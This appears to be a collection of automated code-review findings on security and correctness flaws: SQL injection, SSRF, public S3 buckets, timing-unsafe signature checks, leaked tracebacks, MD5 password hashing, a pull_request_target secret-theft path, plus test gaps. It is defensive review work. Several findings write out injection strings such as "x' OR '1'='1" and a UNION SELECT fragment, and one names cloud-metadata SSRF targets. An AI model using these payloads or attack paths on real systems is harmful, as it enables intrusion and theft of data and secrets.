findings.body: The `bulk_export` function is a public API endpoint that now accepts `report_ids` from any caller without documenting who is permitted to access each report. After the removal of `require_owner`, it is unclear whether callers can export reports they do not own. A competent caller reviewing the signature alone cannot determine the authorization boundary. Either restore the check and document the rejection case, or add a docstring explicitly stating that the function exports any reports by ID regardless of ownership (if that is intentional).

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` composes its query with an f-string, splicing `term` and `status` straight into the statement inside single quotes, then calls `execute(sql)` with no `params`. Any caller value containing a quote breaks out of the literal: e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%' UNION SELECT ... --"` lets the caller choose the projected columns or append further statements depending on the driver's multi-statement handling.

The fix matches the function directly above it on line 5 and the contract documented in `billing/db.py` ("`params` must carry every caller value"):

```python
def search_customers(term, status):
    sql = ("SELECT * FROM customers "
           "WHERE name LIKE %s AND status = %s")
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the *parameter value*, not in the SQL text, so the `LIKE` pattern stays parameterised.

findings.title: search_customers interpolates values instead of passing params to execute
findings.body:
`billing/db.execute(sql, params=None)` documents that "`params` must carry every caller value", and `get_customer` on line 5 follows that (`%s` placeholder plus a tuple). `search_customers` instead embeds `term` and `status` directly into the SQL text and calls `execute(sql)` with no params at all.

Beyond the obvious injection exposure, this is wrong for benign inputs:

- Any value containing an apostrophe (e.g. `term="O'Brien"`, a very ordinary customer name) closes the quote early and the statement fails to parse \u2014 a runtime error, not a filtered result.
- `%` and `_` in `term` are LIKE metacharacters and are not escaped, so `term="50%"` silently matches far more rows than intended.

Rewrite to match line 5's pattern and let the driver bind the values, e.g.:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If leading/trailing wildcards should not be user-controllable, escape `%`/`_` in `term` before wrapping it.

findings.title: No test exists for search_customers, masking SQL injection defect
findings.body: search_customers builds a query via f-string interpolation of `term` and `status` directly into SQL text, unlike get_customer which parameterises correctly. There is no test in this diff exercising search_customers, so nothing would fail or flag that user input is concatenated unsafely into SQL. A test asserting that execute() is called with a parameterised query (and untouched literal SQL string) would have caught this regression at review time.

findings.title: SSRF: verify_endpoint fetches caller URL, skipping ALLOWED_HOSTS check
findings.body:
`verify_endpoint(url)` passes its argument straight to `requests.get` with no parsing, scheme restriction, or host allowlist. The function immediately above it in the same file (lines 8-10) demonstrates the control that is expected here: it resolves the host and raises `ValueError("destination not allowed")` unless the host is in `ALLOWED_HOSTS`. The new entry point bypasses that control entirely.

Sink: `requests.get(url, timeout=5)` on line 14. Entry point: the `url` parameter, which per the PR description is the customer-registered webhook target — i.e. attacker-controlled. Consequences of an unauthenticated or low-privilege caller controlling this value:

- Internal network and cloud metadata reachability (`http://169.254.169.254/...`, `http://localhost:<port>/...`), with the HTTP status code returned to the caller acting as an oracle for port/endpoint existence.
- Non-HTTP schemes: `requests` with the default adapters will also handle `file://` if a file adapter is mounted, and scheme confusion is avoidable cheaply — reject anything that is not `http`/`https` explicitly.

Fix: route this through the same validation used by the send path — parse the URL, require `http`/`https`, resolve the host and enforce `ALLOWED_HOSTS` (and reject private/link-local address literals), and pass `allow_redirects=False` so a permitted host cannot 302 the request onto an internal target.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS invariant enforced above
findings.body: The delivery function immediately above rejects any URL whose host is not in `ALLOWED_HOSTS` before calling `requests.post`. `verify_endpoint` performs the same kind of server-side fetch on a caller-supplied URL with no host or scheme check at all, so the invariant the module establishes on line 8-9 no longer holds for every outbound request in this file. Extract the host check into a helper and call it from both functions (and pass `allow_redirects=False`, since a 302 from an allowed host would otherwise re-introduce the same gap in the post path's model).

findings.title: New verify_endpoint has no test and lacks the allowlist check used elsewhere
findings.body: verify_endpoint issues a server-side GET to a caller-supplied URL without the ALLOWED_HOSTS check applied a few lines above for the POST path. There is no test in this diff exercising verify_endpoint, so a regression (e.g. someone assuming it already validates the host, or a future refactor that breaks the intended behavior) would not be caught by any test.

findings.title: Public function `verify_endpoint` lacks documentation of contract
findings.body: The function `verify_endpoint` accepts a URL parameter and performs a network request, but has no docstring explaining what it does, what the URL should be, or what the caller should expect from the return value. A competent caller might assume it returns a boolean (True/False for valid/invalid) rather than an HTTP status code, or might not know if it validates the URL against any allowlist before fetching it (unlike the existing `send_webhook` function on line 10). Add a docstring clarifying the function's purpose, parameter constraints, and return type.

findings.title: Public access block fully disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for `acme-customer-invoices`. These four settings are the guardrail that prevents any ACL or bucket policy — added later, by any principal with `s3:PutBucketPolicy`/`s3:PutBucketAcl`, or by a copy-paste of the `assets` policy — from making objects world-readable. With them off, a single subsequent ACL or policy change silently exposes customer invoices to anonymous readers, and `ignore_public_acls = false` means object-level ACLs set by uploaders are honoured too.

This block appears to have been copied from the `assets` resource above, where public access is intentional. For `invoices`, either delete the `aws_s3_bucket_public_access_block.invoices` resource entirely (the account-level block then applies) or, preferably, declare it explicitly with all four values set to `true`.

_Also raised by the correctness agent:_ invoices bucket disables all S3 public access protections

findings.title: Signature compared with == instead of hmac.compare_digest
findings.body:
`verify_acmepay` is a copy of `verify_stripe` except that the final comparison uses `==`. `str.__eq__` short-circuits on the first differing byte, so the time taken to reject a candidate signature leaks how many leading hex characters were correct. An attacker who can submit repeated webhook deliveries can recover the expected digest byte-by-byte and then forge arbitrary payloads for this provider. Replace line 12 with `return hmac.compare_digest(expected, header)` to match the pattern already established on line 7.

Secondary consequence of the same line: the two functions now also behave differently on malformed input. `hmac.compare_digest` raises `TypeError` when `header` is `None` or a non-ASCII `str`, whereas `expected == header` quietly returns `False`. Whichever behaviour callers rely on, it should be the same for both providers; switching to `compare_digest` makes them consistent.

_Also raised by the security agent:_ Webhook signature compared with `==` instead of compare_digest

findings.title: No test exists to catch verify_acmepay's unsafe comparison
findings.body: verify_acmepay is new, security-sensitive code (webhook signature verification) but has no accompanying test in this diff. Without a test asserting behavior on valid/invalid signatures, a regression like the use of == instead of hmac.compare_digest (as seen here) would ship silently. Since verify_stripe presumably has some test coverage given it's the established pattern, the new function should have equivalent coverage.

findings.title: Exception text and traceback returned to the client
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body and logged the detail server-side. It now serialises `str(exc)` and `traceback.format_exc()` into the HTTP 500 response body. Any unauthenticated caller who can provoke an exception (malformed input, oversized payload, bad content type, a DB timeout) receives file system paths, module and function names, library versions implied by frame paths, and frequently fragments of the offending data — SQL text from a DBAPI error, connection strings from a driver error, or key material embedded in a message from a crypto library. That is direct reconnaissance value for an attacker mapping the service, and in some cases an outright secret disclosure.

Keep the detail where it already goes: `log.exception("request failed")` on line 8 already captures the full traceback server-side. Restore the opaque client body, and if debugging correlation is the goal, generate a request/error ID, log it alongside the exception, and return only that ID to the caller. If verbose output is genuinely wanted for local work, gate it behind an explicit debug flag that defaults to off rather than making it the unconditional behaviour.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and yields "NoneType: None" outside a handler

_Also raised by the correctness agent:_ Error response body shape changed: fixed message replaced by variable text plus new key

findings.title: Public error handler lacks contract documentation
findings.body: The `handle()` function is a public error handler that now returns exception details and tracebacks to clients. Without a docstring explaining what this function does, what it accepts, and what it returns, callers cannot understand the contract. The fact that it now exposes internal exception text and full tracebacks to clients is a significant behavior change that should be explicitly documented so callers understand they are receiving sensitive internals.

findings.title: No test guards response contents of handle()
findings.body: The handle() function's return value changed from a generic error message to one containing the raw exception string and full traceback. No test file is included in this diff, so nothing would fail if this response body changed again (e.g., reverted, or expanded further) or if it started leaking more/less information. A test asserting on the exact structure of the returned tuple/dict (e.g., that it does NOT contain 'traceback' or arbitrary exception internals) would catch regressions here.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password hash with a single unsalted MD5 pass. MD5 is fast and hardware-accelerated, so an attacker holding the hash table can brute-force or rainbow-table these values essentially for free, and identical passwords produce identical digests across accounts. The module already has the right primitive one function above it: reuse `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` (or delegate to `hash_password`) for anything that ends up in the password column, and verify with `bcrypt.checkpw`. If this value is actually meant to be a short-lived reset *token* rather than a stored password, generate it with `secrets.token_urlsafe` and hash it with SHA-256, and rename the function so it cannot be mistaken for password storage.

The caller is not in this diff, so I cannot confirm where the digest is persisted or compared \u2014 but the name and the `raw` password argument make password storage the plain reading.

findings.title: Public password function contract unclear: MD5 weakness undocumented
findings.body: `hash_reset_password` is a public function that hashes passwords using MD5, a cryptographically weak algorithm unsuitable for password storage. The function name and signature do not communicate this critical security distinction from the correct `hash_password` function above it, which uses bcrypt. A caller could easily confuse these two functions or assume the function provides password-grade security. At minimum, the function needs a docstring explicitly stating that it uses MD5 and should not be used for storing passwords, or the implementation should be corrected to use a proper password hashing algorithm.

findings.title: Reset hash format is incompatible with existing bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a 32-character MD5 hex digest with no salt and no algorithm prefix. If both values are written to the same stored-credential field, the existing verification path will either raise or silently fail for every account that went through the reset flow, and there is no marker in the stored value that lets a caller tell the two encodings apart. Reset passwords should go through `hash_password` (or the stored value must carry an explicit scheme tag that the verifier dispatches on).

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password is a new function introduced in this diff with no accompanying test. Nothing would fail if its implementation were changed to something incorrect, insecure, or simply broken (e.g. returning a constant, throwing on certain inputs, or being swapped for a different hash algorithm). Since this touches the password reset path, add at least a basic test asserting the function returns a deterministic hash of the input.

findings.title: pull_request_target executes fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and a `GITHUB_TOKEN` with the repository's default (typically write) permissions, and it is triggered by pull requests from forks with no approval gate. Lines 11-12 then deliberately check out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 executes `./scripts/measure.sh` *from that checkout*, with `secrets.NPM_TOKEN` injected into its environment on lines 14-15.

Entry point: any unauthenticated GitHub user opens a PR from a fork containing a modified `scripts/measure.sh` (or any file it sources, plus package manifests / lifecycle scripts it may invoke). Sink: the `run` step, executing as a privileged job. The attacker gets `NPM_TOKEN` (publish rights on the npm package) and the workflow's `GITHUB_TOKEN`, and can push commits, alter releases, or poison caches.

Remedies, in order of preference:
- Revert to `pull_request`. If the size check only reads the diff, it does not need base-repo secrets at all. Only the NPM_TOKEN requirement suggests otherwise — if the script needs a registry token merely to install dependencies, use a read-only token and keep the untrusted trigger.
- If `pull_request_target` is genuinely required, do **not** check out the head SHA and do not execute anything from it. Split into two workflows: an untrusted `pull_request` job that builds and uploads an artifact, and a `workflow_run` job that consumes the artifact and holds the secrets.
- At minimum, add an explicit `permissions:` block scoped to the least privilege needed, and gate the job behind an environment requiring reviewer approval for first-time/outside contributors.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with NPM_TOKEN

findings.title: Measurement now runs on head commit, not the merge result
findings.body: With the previous `pull_request` trigger, `actions/checkout` defaults to the PR *merge* commit (`refs/pull/N/merge`), so the size measurement reflected what the repository would look like after merging. Pinning `ref: github.event.pull_request.head.sha` measures the fork's head commit in isolation, which diverges from the merge result whenever the base branch has moved. Size numbers reported on the PR (and any threshold gating built on them) will silently be computed against a stale base. If the intent is to keep measuring the merged state, check out the base and merge, or keep the merge-ref behaviour.

findings.title: pull_request_target runs the base branch's workflow file
findings.body: `pull_request_target` always evaluates the workflow definition from the base branch, not from the PR head. This change therefore will not take effect for the PR that introduces it, and future edits to `.github/workflows/size.yml` will not be exercised by CI before merge. Also note the check name/context reported to branch protection comes from a different event now; if `size` is a required status check, confirm the required-context configuration still matches after the trigger change.

findings.title: json.dumps narrows accepted context values; hashable-but-unserialisable now raises
findings.body:
The previous key was `tuple(sorted(context.items()))`, which accepted any context whose values were hashable and comparable. The new key runs `json.dumps([template_source, context], sort_keys=True)`, which accepts only JSON-serialisable values. Template contexts very commonly carry `datetime`, `Decimal`, sets, or domain objects with a `__str__` \u2014 all hashable, none JSON-serialisable \u2014 and every such call now raises `TypeError: Object of type X is not JSON serializable` from inside `cached_render`, converting a working render into a hard failure.

Two secondary edge cases from the same line: `sort_keys=True` raises `TypeError: '<' not supported between instances of 'int' and 'str'` for a context with mixed-type keys, and int key `1` vs string key `"1"` both serialise to `"1"`, silently colliding into one cache entry.

If the digest form is wanted, pass `default=repr` (or a `cls=` encoder) to `json.dumps` so unserialisable values degrade to a stable string instead of raising, and confirm no caller passes non-string context keys.

findings.title: No test that different template_source values produce different cache entries
findings.body: The new key derivation hashes `[template_source, context]` together. All new tests vary only `context` while holding `template_source` constant (`"{{ a }}"`). There is no test asserting that two calls with the same context but different `template_source` are treated as distinct cache entries — a regression that swapped the digest to hash only `context` (or mishandled the list ordering) would still pass every test in this file.

findings.title: Switch to json.dumps changes serializability requirements for context, untested
findings.body: The old implementation keyed on `tuple(sorted(context.items()))`, which only required context values to be sortable/hashable. The new implementation requires the entire context to be JSON-serializable via `json.dumps`. Any caller previously passing non-JSON-serializable but hashable/orderable values (e.g. tuples, custom objects with __lt__) would now raise TypeError instead of caching successfully. No test exercises this behavior change or documents the new constraint.

findings.title: directory is no longer shell-split or glob-expanded
findings.body: Under the old `shell=True` form, `directory` was handed to `/bin/sh`, so any caller passing a glob (`/srv/data/*`), multiple paths (`/srv/a /srv/b`), or a `~` prefix had those expanded/split by the shell before `tar` saw them. In the list form `directory` is exactly one argv element, so `tar` receives the literal string and will fail with "Cannot stat: No such file or directory" (then `check=True` raises `CalledProcessError`). If any existing caller relies on that expansion this is a silent runtime break, not a rejected input. Please confirm every call site passes a single literal path, or accept an iterable of paths and splat it into the argv.

findings.title: Test only checks mock kwarg `shell`, not the actual argv list
findings.body: `test_runs_without_a_shell` replaces `subprocess.run` with a spy and asserts `spy.last_call.kwargs["shell"] is False`. It never inspects the positional `args` the code actually builds (the list `["tar", "-czf", f"/exports/{name}.tar.gz", "--", directory]`), which is the actual fix for the shell-injection bug this PR closes. A regression that kept `shell=False` but reverted to building a single interpolated command string (e.g. `f"tar -czf ... {directory}"`) would still pass this assertion, even though it defeats the purpose of the change (and would either break at runtime or reintroduce risk depending on how it's invoked). Add an assertion on `spy.last_call.args` (or equivalent) verifying the command is a list with `directory` as a separate, unquoted element.

findings.title: Allowlist omits '.', so dotted archive names now raise ValueError
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]`. Archive names commonly carry a date or version with dots (`nightly.2024-01-01`, `export.v2`), and such names worked fine before this change. They now raise `ValueError` — a new exception type on a previously-succeeding path, which callers are unlikely to catch. Either add `.` to the character class (path traversal is still blocked, since `fullmatch` on a class without `/` cannot produce a separator and `..` alone would still need to be excluded explicitly) or confirm no caller uses dotted names. Note also that a non-`str` `name` (e.g. `None`) raises `TypeError` from `fullmatch` rather than the documented `ValueError`.

findings.title: test_renders_empty_invoice has no assertion
findings.body:
This test calls render() but never checks its return value or any side effect. It will pass even if render() raises no error but produces incorrect (or no) output for an empty invoice — it cannot fail on a behaviour regression.

_Also raised by the correctness agent:_ test_renders_empty_invoice contains no assertion

findings.title: test_renders_line_items asserts only mock call count, not output
findings.body:
The test patches invoice.format_line and asserts fmt.call_count == 2, but never checks what render() actually produces. If format_line's output were wrong, dropped, or mis-ordered in the final rendered string, this test would still pass. It only verifies that the function was invoked twice, not that the invoice renders line items correctly.

_Also raised by the correctness agent:_ Line-item test asserts on mock call count, not rendered output

findings.title: Deleted test removes coverage for the rounding fix itself
findings.body:
The PR title states it fixes a rounding bug, but the diff deletes test_rounds_half_to_even, which was the test exercising Decimal('2.345') rounding to Decimal('2.34') (banker's rounding / round-half-to-even). With this test gone, nothing in the remaining suite verifies that half-to-even rounding behavior is correct. If the fix is wrong or regresses in the future, no test will fail to catch it.

_Also raised by the correctness agent:_ Tie-breaking rounding test deleted, leaving boundary behaviour unasserted

findings.title: Patch targets definition site, so real deliver() still runs
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as a module-level name in `notify.sender` at import time. Patching `notify.transport.deliver` rebinds the attribute on the *transport* module only; `send_with_retry` continues to call the original function object it captured. The test therefore exercises the real `deliver` — it will either hit whatever the real transport does (network/IO) or pass/fail for reasons unrelated to the retry logic, and it proves nothing about giving up after three failures.

Use the same target as the test directly above it: `mocker.patch("notify.sender.deliver", return_value=False)`. While you are there, consider capturing the mock and asserting `mock.call_count == 3`, since otherwise the assertion cannot distinguish "retried three times" from "returned False immediately".

_Also raised by the tests agent:_ Mock patches wrong target; retry test doesn't test the mock

findings.title: csv_rows joins raw values without calling csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never routes values through `csv_escape`, which is added in the same commit immediately below. Any cell value containing a comma or a double quote (a free-text description, a name like `"Doe, Jane"`, a numeric string with thousands separators) emits an extra field separator or an unbalanced quote, so the row no longer parses back to the same column count. Wrap the value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

_Also raised by the security agent:_ csv_rows joins field values without applying csv_escape

findings.title: New exporter functions lack any test coverage
findings.body: Six new public functions (csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, usable_width) were added with real logic — quoting rules, chunk boundaries, integer-division margin math — but the repo's existing test convention (one assertion-based test per exporter behaviour, see reports/tests/test_csv.py) is not extended to any of them. If csv_escape mishandled a trailing quote, if dump_streaming's chunk boundary were off-by-one, or if margins_for's arithmetic were wrong, nothing in the suite would fail.

findings.title: csv_escape ignores newlines and raises TypeError on non-str input
findings.body: Two gaps in `csv_escape`. (1) A value containing `\n` or `\r` must also be quoted under RFC 4180; as written such a value is returned bare and splits one record into two on read-back. Extend the condition to include `"\n"` and `"\r"`. (2) `"," in value` raises `TypeError: argument of type 'int' is not iterable` for any non-string input, which is a realistic call shape given the sibling `csv_rows` deals in arbitrary dict values; coerce with `value = str(value)` first.

findings.title: dump_streaming yields nothing for empty rows and dies on chunk_size=0
findings.body: `range(0, len(rows), chunk_size)` is empty when `rows` is empty, so a caller concatenating the generator's output gets an empty string rather than a valid `[]` document — unlike `dump([])`, which returns `"[]"`. It also raises `ValueError: range() arg 3 must not be zero` for `chunk_size=0` and silently yields nothing for a negative value. Guard the argument (`if chunk_size < 1: raise ValueError(...)`) and decide explicitly whether the empty input should yield one empty array. Note also that unlike `dump`, this variant requires a sized, sliceable sequence and will fail on a generator.

findings.title: Flaky assertion on wall-clock date at midnight boundary
findings.body:
`test_token_issued_today_is_valid` calls `issue_token()` (which presumably stamps `issued_at` with the real current time) and then separately calls `datetime.now(timezone.utc).date()` to compare. If the token is issued at 23:59:59.99 UTC and the comparison's `datetime.now()` call executes after midnight, `token.issued_at.date()` and `datetime.now(timezone.utc).date()` will differ by one day, failing the test even though nothing is wrong with `issue_token` or `is_expired`. This is exactly the time-dependent flakiness the PR title calls out. The test should use a fixed/injected clock (e.g. pass `now=` explicitly as the other test does) instead of relying on real wall-clock time twice.

_Also raised by the correctness agent:_ `is_expired` called without the `now=` argument used elsewhere

findings.title: Date comparison races the UTC midnight boundary
findings.body: `issue_token()` captures `issued_at` at one instant, and `datetime.now(timezone.utc).date()` is evaluated at a strictly later instant. If the token is issued at 23:59:59.999 UTC and the assertion runs a moment later, the two `.date()` values differ by a day and the test fails — non-deterministically, and only on a scheduled/CI run unlucky enough to land there. Fix by injecting the clock the same way the test above does (`is_expired(..., now=...)`): capture `before = datetime.now(timezone.utc)` and `after = datetime.now(timezone.utc)` around the call and assert `before <= token.issued_at <= after`, or freeze/inject the time source into `issue_token()` so the test asserts an exact value.

findings.title: No test for CouponExpired branch
findings.body: The new logic raising CouponExpired when coupon.expires_at is in the past is untested. The only test updated in this PR (test_apply_coupon_reduces_total) uses a coupon expiring tomorrow, so it never exercises the expired path. If the comparison were inverted, or the exception were never raised, no test would fail.

findings.title: expires_at may be None or naive, raising TypeError instead of CouponExpired
findings.body:
Line 9 compares `coupon.expires_at` directly against an aware `datetime.now(timezone.utc)`. Two reachable inputs break this:

- A coupon with no expiry (`expires_at is None`) raises `TypeError: '<' not supported between instances of 'NoneType' and 'datetime.datetime'`.
- A coupon whose `expires_at` was stored as a naive datetime raises `TypeError: can't compare offset-naive and offset-aware datetimes`.

The test change on `tests/test_coupons.py:3` shows `Coupon` previously worked without an `expires_at` argument, so instances lacking a usable value are plausible in existing data/fixtures. Guard explicitly, e.g. `if coupon.expires_at is not None and coupon.expires_at < now`, and normalise naive values to UTC before comparing.
